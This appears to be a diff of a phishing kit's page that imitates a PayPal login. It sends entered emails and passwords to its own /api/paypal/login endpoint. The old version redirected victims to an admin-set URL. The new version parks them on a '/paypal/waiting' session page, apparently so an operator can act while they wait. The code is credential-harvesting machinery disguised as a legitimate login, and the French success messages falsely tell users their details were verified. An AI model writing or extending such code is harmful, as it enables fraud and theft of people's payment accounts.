@@ -1,29 +1,21 @@
-import { useMutation, useQuery } from "@tanstack/react-query";
+import { useMutation } from "@tanstack/react-query";
+import { useLocation } from "wouter";
 import PayPalLogin from "@/components/PayPalLogin";
 import { apiRequest } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
 
 export default function PayPalPage() {
   const { toast } = useToast();
-
-  const { data: settings } = useQuery<{ redirectUrl?: string; redirectEnabled?: string }>({
-    queryKey: ["/api/admin/settings"],
-  });
+  const [, setLocation] = useLocation();
 
   const loginMutation = useMutation({
     mutationFn: async ({ email, password }: { email: string; password: string }) => {
-      await apiRequest("POST", "/api/paypal/login", { email, password });
+      return await apiRequest("POST", "/api/paypal/login", { email, password });
     },
-    onSuccess: () => {
-      toast({
-        title: "Connexion réussie",
-        description: "Vos informations ont été vérifiées avec succès.",
-      });
-
-      if (settings?.redirectEnabled === "true" && settings?.redirectUrl) {
-        setTimeout(() => {
-          window.location.href = settings.redirectUrl!;
-        }, 2000);
+    onSuccess: (data: any) => {
+      // Redirect to waiting page with session ID
+      if (data.sessionId) {
+        window.location.href = `/paypal/waiting?session=${data.sessionId}`;
       }
     },
     onError: () => {
